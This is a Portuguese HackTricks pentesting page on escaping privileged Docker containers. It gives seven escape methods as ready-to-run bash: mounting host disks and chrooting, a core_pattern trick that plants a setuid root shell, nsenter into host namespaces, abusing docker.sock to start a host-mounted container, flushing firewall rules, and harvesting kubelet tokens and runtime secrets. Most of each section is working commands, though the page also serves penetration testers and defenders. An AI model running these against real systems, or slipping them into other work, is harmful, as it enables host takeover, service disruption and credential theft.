# Escapando de contêineres `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Um contêiner iniciado com `--privileged` não é o mesmo que um contêiner normal com uma ou duas permissões extras. Na prática, `--privileged` remove ou enfraquece várias das proteções padrão do runtime que normalmente mantêm a carga de trabalho afastada de recursos perigosos do host. O efeito exato ainda depende do runtime e do host, mas para Docker o resultado usual é:

- todas as capabilities são concedidas
- as restrições do device cgroup são removidas
- muitos sistemas de arquivos do kernel deixam de ser montados como somente leitura
- os caminhos padrão mascarados do procfs desaparecem
- o filtro seccomp é desativado
- o confinamento do AppArmor é desativado
- o isolamento do SELinux é desativado ou substituído por um rótulo muito mais amplo

A consequência importante é que um contêiner privilegiado normalmente não precisa de um kernel exploit sutil. Em muitos casos ele pode simplesmente interagir com dispositivos do host, sistemas de arquivos do kernel expostos ao host, ou interfaces do runtime diretamente e então pivotar para um shell do host.

## O que `--privileged` não altera automaticamente

`--privileged` **não** entra automaticamente nos namespaces PID, network, IPC ou UTS do host. Um contêiner privilegiado ainda pode ter namespaces privados. Isso significa que algumas cadeias de escape requerem uma condição extra, tal como:

- um bind mount do host
- compartilhamento de PID com o host
- networking do host
- dispositivos do host visíveis
- interfaces proc/sys graváveis

Essas condições são frequentemente fáceis de satisfazer em configurações incorretas na prática, mas são conceitualmente separadas do próprio `--privileged`.

## Caminhos de escape

### 1. Montar o disco do host através de dispositivos expostos

Um contêiner privilegiado geralmente vê muito mais nós de dispositivo sob `/dev`. Se o bloco de dispositivo do host estiver visível, a forma mais simples de escape é montá-lo e usar `chroot` no sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se a partição root não for óbvia, enumere primeiro o layout dos blocos:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se a via prática for plantar um setuid helper em um writable host mount em vez de `chroot`, lembre-se de que nem todo sistema de arquivos honra o bit setuid. Uma verificação rápida de capacidade no lado do host é:
```bash
mount | grep -v "nosuid"
```
Isto é útil porque caminhos graváveis sob sistemas de arquivos `nosuid` são muito menos interessantes para os fluxos de trabalho clássicos "drop a setuid shell and execute it later".

As proteções enfraquecidas que estão sendo abusadas aqui são:

- exposição completa de dispositivos
- capabilities amplas, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar Ou Reutilizar Um Host Bind Mount E `chroot`

Se o sistema de arquivos root do host já estiver montado dentro do container, ou se o container puder criar as montagens necessárias porque é privilegiado, um shell do host muitas vezes está a apenas um `chroot` de distância:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se não existir um bind mount do root do host, mas o armazenamento do host estiver acessível, crie um:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este caminho abusa de:

- restrições de mount enfraquecidas
- capabilities completas
- falta de confinamento MAC

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusar de `/proc/sys` Ou `/sys`

Uma das grandes consequências do `--privileged` é que as proteções do procfs e do sysfs ficam muito mais fracas. Isso pode expor interfaces do kernel voltadas ao host que normalmente são mascaradas ou montadas como somente leitura.

Um exemplo clássico é `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Outros caminhos de alto valor incluem:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este caminho abusa de:

- caminhos mascarados ausentes
- caminhos de sistema somente leitura ausentes

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar capacidades completas para Mount- Or Namespace-Based Escape

Um privileged container recebe as capabilities que normalmente são removidas de containers padrão, incluindo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` e muitas outras. Isso frequentemente é suficiente para transformar um local foothold em um host escape assim que outra superfície exposta existir.

Um exemplo simples é montar sistemas de arquivos adicionais e usar namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se o PID do host também estiver compartilhado, a etapa fica ainda mais curta:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Este caminho abusa de:

- o conjunto padrão de capabilities privilegiadas
- compartilhamento opcional de PID do host

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escapar através de sockets do runtime

Um container privilegiado frequentemente acaba com o estado de runtime do host ou sockets visíveis. Se um socket Docker, containerd, ou CRI-O estiver acessível, a abordagem mais simples muitas vezes é usar a runtime API para lançar um segundo container com acesso ao host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Este caminho abusa de:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Remover efeitos colaterais do isolamento de rede

`--privileged` por si só não ingressa no namespace de rede do host, mas se o container também tiver `--network=host` ou outro acesso à rede do host, toda a pilha de rede se torna mutável:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso nem sempre é um host shell direto, mas pode resultar em denial of service, traffic interception ou acesso a loopback-only management services.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ler Segredos do Host e o Estado de Runtime

Mesmo quando uma clean shell escape não é imediata, privileged containers frequentemente têm acesso suficiente para ler host secrets, kubelet state, runtime metadata e os sistemas de arquivos de containers vizinhos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` estiver montado no host ou os diretórios de runtime forem visíveis, isso pode ser suficiente para lateral movement ou cloud/Kubernetes credential theft mesmo antes de um host shell ser obtido.

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Verificações

O propósito dos comandos a seguir é confirmar quais privileged-container escape families são imediatamente viáveis.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
O que é interessante aqui:

- um conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposição de proc/sys com permissão de escrita
- dispositivos do host visíveis
- ausência de seccomp e MAC confinement
- runtime sockets ou host root bind mounts

Qualquer um desses pode ser suficiente para post-exploitation. Vários juntos geralmente significam que o container está funcionalmente a um ou dois comandos de distância do host compromise.

## Páginas Relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
